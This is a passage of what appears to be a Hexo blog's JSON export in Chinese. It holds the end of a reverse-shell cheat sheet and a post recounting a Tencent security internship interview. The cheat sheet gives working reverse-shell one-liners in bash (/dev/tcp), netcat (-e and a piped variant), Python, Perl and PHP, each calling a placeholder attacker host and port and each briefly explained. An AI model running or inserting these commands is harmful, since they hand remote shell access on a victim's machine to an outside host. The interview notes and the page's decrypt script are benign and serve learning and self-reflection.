rel=\"noopener\">https://www.freebuf.com/articles/system/178150.html</a></p>\n<p><a href=\"https://www.freebuf.com/articles/system/153986.html\" target=\"_blank\" rel=\"noopener\">https://www.freebuf.com/articles/system/153986.html</a></p>\n","site":{"data":{}},"excerpt":"<h2 id=\"linux下的反弹\"><a href=\"#linux下的反弹\" class=\"headerlink\" title=\"linux下的反弹\"></a>linux下的反弹</h2><p>本机使用nc</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nc -lvp port</span><br></pre></td></tr></table></figure>","more":"<h3 id=\"bash\"><a href=\"#bash\" class=\"headerlink\" title=\"bash\"></a>bash</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;host&#x2F;port 0&gt;&amp;1</span><br></pre></td></tr></table></figure>\n\n<blockquote>\n<ul>\n<li><p>linux shell下常用的文件描述符是：</p>\n<blockquote>\n<ol>\n<li><p>标准输入  (stdin) ：代码为 0 ，使用 &lt; 或 &lt;&lt; ； </p>\n</li>\n<li><p>标准输出  (stdout)：代码为 1 ，使用 &gt; 或 &gt;&gt; ； </p>\n</li>\n<li><p>标准错误输出(stderr)：代码为 2 ，使用 2&gt; 或 2&gt;&gt;。</p>\n</li>\n</ol>\n</blockquote>\n</li>\n<li><p>bash -i 新开一个交互bash</p>\n</li>\n<li><p>&gt;&amp;或者 &amp;&gt;  将标准错误输出定向到标准输出中</p>\n</li>\n<li><p>0&gt;&amp;1或者0&lt;&amp;1将标准输入重定向到标准输出中</p>\n</li>\n<li><p>/dev/tcp/host/port  使用tcp通道与host:post建立一个连接</p>\n</li>\n<li><p>如果还是不清楚 参考手册<a href=\"https://www.gnu.org/software/bash/manual/bash.pdf\" target=\"_blank\" rel=\"noopener\">https://www.gnu.org/software/bash/manual/bash.pdf</a> 3.6 章redirections</p>\n</li>\n</ul>\n</blockquote>\n<h3 id=\"nc\"><a href=\"#nc\" class=\"headerlink\" title=\"nc\"></a>nc</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nc -e &#x2F;bin&#x2F;bash host port</span><br></pre></td></tr></table></figure>\n\n<blockquote>\n<p>nc -e   inbound program to exec [dangerous!!]</p>\n</blockquote>\n<p>有些版本的NC没有-e选项，在本机开两个端口</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nc -lvp port1</span><br><span class=\"line\">nc -lvp port2</span><br></pre></td></tr></table></figure>\n\n\n\n<p>受控机</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nc host port1 | &#x2F;bin&#x2F;bash | nc host port2</span><br></pre></td></tr></table></figure>\n\n<blockquote>\n<ul>\n<li><p>管道命令，从host:pot1输入数据交给 /bin/bash处理，再交给host：port2输出</p>\n</li>\n<li><p>将nc 改成telnet 也是可以的</p>\n</li>\n</ul>\n</blockquote>\n<h3 id=\"python\"><a href=\"#python\" class=\"headerlink\" title=\"python\"></a>python</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python3 -c &#39;import socket,subprocess,os;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;host&quot;,port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p&#x3D;subprocess.call([&quot;&#x2F;bin&#x2F;sh&quot;,&quot;-i&quot;]);&#39;</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"perl\"><a href=\"#perl\" class=\"headerlink\" title=\"perl\"></a>perl</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">perl -e &#39;use Socket;$i&#x3D;&quot;host&quot;;$p&#x3D;port;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;&#x2F;bin&#x2F;bash -i&quot;);&#125;;&#39;</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"php\"><a href=\"#php\" class=\"headerlink\" title=\"php\"></a>php</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">php -r &#39;$sock&#x3D;fsockopen(&quot;host&quot;,port);exec(&quot;&#x2F;bin&#x2F;bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;</span><br></pre></td></tr></table></figure>\n\n<blockquote>\n<p>php反弹shell的这些方法都需要php关闭safe_mode这个选项，才可以使用exec函数</p>\n</blockquote>\n<p>参考连接</p>\n<p><a href=\"https://www.freebuf.com/news/142195.html\" target=\"_blank\" rel=\"noopener\">https://www.freebuf.com/news/142195.html</a></p>\n<p><a href=\"https://www.freebuf.com/articles/system/147768.html\" target=\"_blank\" rel=\"noopener\">https://www.freebuf.com/articles/system/147768.html</a></p>\n<p><a href=\"https://www.freebuf.com/articles/system/178150.html\" target=\"_blank\" rel=\"noopener\">https://www.freebuf.com/articles/system/178150.html</a></p>\n<p><a href=\"https://www.freebuf.com/articles/system/153986.html\" target=\"_blank\" rel=\"noopener\">https://www.freebuf.com/articles/system/153986.html</a></p>"},{"title":"腾讯实习生面经","date":"2020-03-13T08:13:12.000Z","updated":"2020-03-17T11:13:12.000Z","encrypt":"enable","enc_pwd":"7b7a53e239400a13bd6be6c91c4f6c4e","_content":"\n## 0x00 收到面试通知\n\n人生中总有许许多多的第一次，本菜鸡终于迎来了第一次面试。昨天晚上填写的申请，今天就收到了面试通知。效率还是很高的。心情很是复杂，不过不知为什么又有一种什么都不慌的感觉（可能是破罐破摔吧）\n\n<!--more-->\n\n![](/pic/131.png)\n\n\n\n## 0x01 电话接通\n\n感觉面试官挺好的，语气很好，是腾讯云安全部。\n\n**自我介绍**\n\n感觉自己有点语无伦次，语言表达能力有待提高\n\n自己来自于哪个大学balabala，大一弄了几一年ACM，然后最近在打CTF，没有了（**就几十个字**）\n\n感觉自己好傻。。。。（自己年级也忘记说了，面试官后面问的）\n\n**说说打ctf最有印象的题目**\n\n巴拉巴拉说了一个sql注入的题目\n\n**如何判断数据库类型（MYSQL、mssql）**\n\n查看版本，使用特有的函数\n\n**手工猜表名**\n\n我一直以为是有回显，一直搞错了方向。这里绕了好久。\n\n**讲讲影响比较深的xss题目**\n\nbalabala\n\n**项目经历**\n\n面试官一直在引导，没有项目经历可以说一说大作业。然后又扯到了sql注入\n\n**如何防止sql注入**\n\n过滤关键字，添加一个沙盒观察经行行为监控，但是后果是用户体验不好（这个点也是）\n\n**如何入侵linux**\n\n端口扫描，有服务漏洞直接入侵，重点查看80端口和443，写webshell\n\n**有webshell如何提权**\n\n查看运行了什么服务，搜索这些服务的漏洞。\n\n**如何知道被入侵**\n\n查看bash_histery，端口连接情况。\n\n**如何知道bash_histery被修改**\n\n没有答出来，面试官给了答案\n\n**有什么想要问的**\n\n不知道问什么，后面面试官给我介绍了腾讯云云镜\n\n\n\n## 0x02 收到二面通知\n\n几个小时后收到短信，准备二面。\n\n觉得自己打得很菜，特别是sql注入猜表名，答非所问了。努力吧\n\n我害傻乎乎的看错了时间，以为是当天面试，结果是三天后（还打了电话给腾讯客服）\n\n![](/pic/132.png)\n\n\n\n\n\n## 0x03 二面推迟\n\n在快要到面试时间的时候，突然就发了一封邮件过来，推迟了一天\n\n推迟之后，又快到面试时间，一个私人号码打给说要开会，晚点联系\n\n\n\n## 0x04 电话接通\n\n**我看你简历写得很简单，你再来一个自我介绍吧**\n\n大一ACM，大二学渗透（未实践），大三CTF\n\n**大一的ACM有获奖吗，给你带来了什么**\n\n没有参加大型比赛，学会了基础算法，现在熟悉python\n\n**渗透和大三搞的是不是一个东西**\n\nbalabala\n\n**现在最拿手的是什么**\n\nsql注入\n\n**sql注入原理**\n\nbalabala\n\n**有了解过命令执行漏洞和反弹shell吗，怎么产生**\n\nbalabala\n\n**木马变形会吗？还是一句话木马就够用了**\n\n一句话木马就基本够用,有些还要绕过禁用函数\n\n**比如如何绕过**\n\nbalabal\n\n**举两个例子经典入侵case**\n\n端口扫描，查漏洞，重点关注80，443端口\n\n**有遇到过难绕过的点吗**\n\n说了一个ctf题目\n\n**ctf能力在学校的排名**\n\nbalabala\n\n**为什么搞安全**\n\n说了自己的一个经历\n\n**还有什么要问的**\n\n\n\n## 0x05 等待结果\n\n自我感觉可能凉了","source":"_posts/腾讯面经.md","raw":"---\ntitle: 腾讯实习生面经\ndate: 2020-03-13 16:13:12\nupdated: 2020-03-17 19:13:12\nencrypt: enable\nenc_pwd: 7b7a53e239400a13bd6be6c91c4f6c4e\ntags:\n - 日常\ncategories: \n - \n---\n\n## 0x00 收到面试通知\n\n人生中总有许许多多的第一次，本菜鸡终于迎来了第一次面试。昨天晚上填写的申请，今天就收到了面试通知。效率还是很高的。心情很是复杂，不过不知为什么又有一种什么都不慌的感觉（可能是破罐破摔吧）\n\n<!--more-->\n\n![](/pic/131.png)\n\n\n\n## 0x01 电话接通\n\n感觉面试官挺好的，语气很好，是腾讯云安全部。\n\n**自我介绍**\n\n感觉自己有点语无伦次，语言表达能力有待提高\n\n自己来自于哪个大学balabala，大一弄了几一年ACM，然后最近在打CTF，没有了（**就几十个字**）\n\n感觉自己好傻。。。。（自己年级也忘记说了，面试官后面问的）\n\n**说说打ctf最有印象的题目**\n\n巴拉巴拉说了一个sql注入的题目\n\n**如何判断数据库类型（MYSQL、mssql）**\n\n查看版本，使用特有的函数\n\n**手工猜表名**\n\n我一直以为是有回显，一直搞错了方向。这里绕了好久。\n\n**讲讲影响比较深的xss题目**\n\nbalabala\n\n**项目经历**\n\n面试官一直在引导，没有项目经历可以说一说大作业。然后又扯到了sql注入\n\n**如何防止sql注入**\n\n过滤关键字，添加一个沙盒观察经行行为监控，但是后果是用户体验不好（这个点也是）\n\n**如何入侵linux**\n\n端口扫描，有服务漏洞直接入侵，重点查看80端口和443，写webshell\n\n**有webshell如何提权**\n\n查看运行了什么服务，搜索这些服务的漏洞。\n\n**如何知道被入侵**\n\n查看bash_histery，端口连接情况。\n\n**如何知道bash_histery被修改**\n\n没有答出来，面试官给了答案\n\n**有什么想要问的**\n\n不知道问什么，后面面试官给我介绍了腾讯云云镜\n\n\n\n## 0x02 收到二面通知\n\n几个小时后收到短信，准备二面。\n\n觉得自己打得很菜，特别是sql注入猜表名，答非所问了。努力吧\n\n我害傻乎乎的看错了时间，以为是当天面试，结果是三天后（还打了电话给腾讯客服）\n\n![](/pic/132.png)\n\n\n\n\n\n## 0x03 二面推迟\n\n在快要到面试时间的时候，突然就发了一封邮件过来，推迟了一天\n\n推迟之后，又快到面试时间，一个私人号码打给说要开会，晚点联系\n\n\n\n## 0x04 电话接通\n\n**我看你简历写得很简单，你再来一个自我介绍吧**\n\n大一ACM，大二学渗透（未实践），大三CTF\n\n**大一的ACM有获奖吗，给你带来了什么**\n\n没有参加大型比赛，学会了基础算法，现在熟悉python\n\n**渗透和大三搞的是不是一个东西**\n\nbalabala\n\n**现在最拿手的是什么**\n\nsql注入\n\n**sql注入原理**\n\nbalabala\n\n**有了解过命令执行漏洞和反弹shell吗，怎么产生**\n\nbalabala\n\n**木马变形会吗？还是一句话木马就够用了**\n\n一句话木马就基本够用,有些还要绕过禁用函数\n\n**比如如何绕过**\n\nbalabal\n\n**举两个例子经典入侵case**\n\n端口扫描，查漏洞，重点关注80，443端口\n\n**有遇到过难绕过的点吗**\n\n说了一个ctf题目\n\n**ctf能力在学校的排名**\n\nbalabala\n\n**为什么搞安全**\n\n说了自己的一个经历\n\n**还有什么要问的**\n\n\n\n## 0x05 等待结果\n\n自我感觉可能凉了","slug":"腾讯面经","published":1,"_id":"ck7vssfnk001upk7ebraqetq3","comments":1,"layout":"post","photos":[],"link":"","content":"<script src=/js/crypto-js.js></script>\n<script>\nfunction doDecrypt (pwd, onError) {\n\tconsole.log('in doDecrypt');\n\tconst txt = document.getElementById('enc_content').innerHTML;\n\tlet plantext;\n\ttry {\n\t\tconst bytes = CryptoJS.AES.decrypt(txt, pwd);\n\t\tvar plaintext = bytes.toString(CryptoJS.enc.Utf8);\n\t} catch(err) {\n\t\tif(onError) {\n\t\t\tonError(err);\n\t\t}\n\t\treturn;\n\t}\n\tdocument.getElementById('enc_content').innerHTML = plaintext;\n\tdocument.getElementById('enc_content').style.display = 'block';\n\tdocument.getElementById('enc_passwd').style.display = 'none';\n\tif(typeof MathJax !== 'undefined') {\n\t\tMathJax.Hub.Queue(\n\t\t\t['resetEquationNumbers', MathJax.InputJax.TeX],\n\t\t\t['PreProcess', MathJax.Hub],\n\t\t\t['Reprocess', MathJax.Hub]\n\t\t);\n\t}\n}\n</script>\n<div id=\"enc_content\" style=\"display:none\">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</div>\n<div id=\"enc_passwd\"> <input id=\"enc_pwd_input\" type=\"password\" style=\"border-radius: 5px;border-style: groove;height: 30px;width: 50%;cursor: auto;font-size: 102%;color: currentColor;outline: none;text-overflow: initial;padding-left: 5px;\" onkeydown=\"if (event.keyCode == 13) { decrypt(); return false;}\"> <input type=\"submit\" value=\"解&nbsp;密\" onclick=\"decrypt()\" style=\"width: 58px;height: 34px;border-radius: 5px;background-color: white;border-style: solid;color: currentColor;\"><div id=\"enc_error\" style=\"display: inline-block;color: #d84527;margin-left: 10px\"></div>\n<script>\nvar onError = function(error) {\n\tdocument.getElementById(\"enc_error\").innerHTML = \"password error!\"\n};\nfunction decrypt() {\nvar passwd = document.getElementById(\"enc_pwd_input\").value;\nconsole.log(passwd);\ndoDecrypt(passwd, onError);\n}\n</script>\n</div>","site":{"data":{}},"excerpt":"<h2 id=\"0x00-收到面试通知\"><a href=\"#0x00-收到面试通知\" class=\"headerlink\" title=\"0x00 收到面试通知\"></a>0x00 收到面试通知</h2><p>人生中总有许许多多的第一次，本菜鸡终于迎来了第一次面试。昨天晚上填写的申请，今天就收到了面试通知。效率还是很高的。心情很是复杂，不过不知为什么又有一种什么都不慌的感觉（可能是破罐破摔吧）</p>","more":"<p><img src=\"/pic/131.png\" alt=\"\"></p>\n<h2 id=\"0x01-电话接通\"><a href=\"#0x01-电话接通\" class=\"headerlink\" title=\"0x01 电话接通\"></a>0x01 电话接通</h2><p>感觉面试官挺好的，语气很好，是腾讯云安全部。</p>\n<p><strong>自我介绍</strong></p>\n<p>感觉自己有点语无伦次，语言表达能力有待提高</p>\n<p>自己来自于哪个大学balabala，大一弄了几一年ACM，然后最近在打CTF，没有了（<strong>就几十个字</strong>）</p>\n<p>感觉自己好傻。。。。（自己年级也忘记说了，面试官后面问的）</p>\n<p><strong>说说打ctf最有印象的题目</strong></p>\n<p>巴拉巴拉说了一个sql注入的题目</p>\n<p><strong>如何判断数据库类型（MYSQL、mssql）</strong></p>\n<p>查看版本，使用特有的函数</p>\n<p><strong>手工猜表名</strong></p>\n<p>我一直以为是有回显，一直搞错了方向。这里绕了好久。</p>\n<p><strong>讲讲影响比较深的xss题目</strong></p>\n<p>balabala</p>\n<p><strong>项目经历</strong></p>\n<p>面试官一直在引导，没有项目经历可以说一说大作业。然后又扯到了sql注入</p>\n<p><strong>如何防止sql注入</strong></p>\n<p>过滤关键字，添加一个沙盒观察经行行为监控，但是后果是用户体验不好（这个点也是）</p>\n<p><strong>如何入侵linux</strong></p>\n<p>端口扫描，有服务漏洞直接入侵，重点查看80端口和443，写webshell</p>\n<p><strong>有webshell如何提权</strong></p>\n<p>查看运行了什么服务，搜索这些服务的漏洞。</p>\n<p><strong>如何知道被入侵</strong></p>\n<p>查看bash_histery，端口连接情况。</p>\n<p><strong>如何知道bash_histery被修改</strong></p>\n<p>没有答出来，面试官给了答案</p>\n<p><strong>有什么想要问的</strong></p>\n<p>不知道问什么，后面面试官给我介绍了腾讯云云镜</p>\n<h2 id=\"0x02-收到二面通知\"><a href=\"#0x02-收到二面通知\" class=\"headerlink\" title=\"0x02 收到二面通知\"></a>0x02 收到二面通知</h2><p>几个小时后收到短信，准备二面。</p>\n<p>觉得自己打得很菜，特别是sql注入猜表名，答非所问了。努力吧</p>\n<p>我害傻乎乎的看错了时间，以为是当天面试，结果是三天后（还打了电话给腾讯客服）</p>\n<p><img src=\"/pic/132.png\" alt=\"\"></p>\n<h2 id=\"0x03-二面推迟\"><a href=\"#0x03-二面推迟\" class=\"headerlink\" title=\"0x03 二面推迟\"></a>0x03 二面推迟</h2><p>在快要到面试时间的时候，突然就发了一封邮件过来，推迟了一天</p>\n<p>推迟之后，又快到面试时间，一个私人号码打给说要开会，晚点联系</p>\n<h2 id=\"0x04-电话接通\"><a href=\"#0x04-电话接通\" class=\"headerlink\" title=\"0x04 电话接通\"></a>0x04 